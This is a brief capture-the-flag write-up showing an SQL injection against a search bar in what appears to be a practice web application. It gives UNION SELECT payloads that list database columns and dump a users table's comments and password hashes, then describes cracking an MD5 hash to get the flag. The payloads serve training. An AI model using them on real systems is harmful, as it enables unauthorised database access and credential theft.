# flag 0 | sql injection

In this exploit, we will do an sql injection in the `search bar`

If we enter a value like 1, 2, 3 in the searchbar, it will give us some informations
```txt
ID: 1 
First name: one
Surname : me
```

We can do
```sql
10 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS
```

We will see all the possible fields, we can see that there is some fields 
```md
    - Commentaire
    - countersign
    - id_comment
    - url
    - vote
```

We can try to show all the comments and countersign

```sql
1 UNION SELECT Commentaire, countersign FROM users
```

```sql
ID: 1 UNION SELECT Commentaire, countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

So we have to decrypt `5ff9d0165b4f92b14994e5c685cdce28` after some search, we found that it's on md5 and is an equivalent of fortytwo

we have to encrypt it on sha256

Here is the final flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`